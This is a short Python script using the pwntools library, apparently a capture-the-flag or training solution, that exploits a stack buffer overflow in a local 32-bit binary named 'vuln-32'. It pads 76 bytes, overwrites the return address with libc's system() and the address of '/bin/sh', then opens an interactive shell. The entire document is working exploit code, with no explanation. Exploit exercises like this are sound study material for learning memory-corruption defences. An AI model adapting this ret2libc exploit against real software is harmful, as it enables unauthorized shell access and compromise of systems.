from pwn import *

elf = context.binary = ELF("./vuln-32")
p = process()

junk = 76

libc = elf.libc
libc.address = 0xf7d82000

system = p32(libc.sym["system"])
param_bash = p32(next(libc.search(b"/bin/sh")))
ret_param = p32(0x0)

payload = b"A" * junk + system + ret_param + param_bash

p.sendline(payload)
p.interactive()